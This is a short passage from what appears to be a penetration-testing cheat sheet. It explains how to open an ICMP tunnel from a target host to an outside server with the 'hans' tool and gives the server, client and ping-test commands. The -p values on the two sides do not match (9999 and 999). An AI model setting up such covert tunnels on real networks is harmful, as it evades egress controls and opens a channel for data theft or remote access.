## Opening an ICMP tunnel

If ICMP traffic is allowed to external networks then most likely you can establish an ICMP tunnel.
The downside is that you will need root/administrator privileges on the target system because of the necessity to use raw sockets. 

On the server side:

```bash
./hans -v -f -s 1.1.1.1 -p 9999
```

The `-v` flag is for verbosity, the `-f` flag is to run in foreground and the `-s` flag’s value is the server’s ip on the newly created tun interface.

On the client side:

```bash
./hans -f -c <server_ip> -p 999 -v
```

Testing the ICMP connection:

```bash
ping 1.1.1.100
PING 1.1.1.100 (1.1.1.100) 56(84) bytes of data.
64 bytes from 1.1.1.100: icmp_seq=1 ttl=65 time=42.9 ms
```
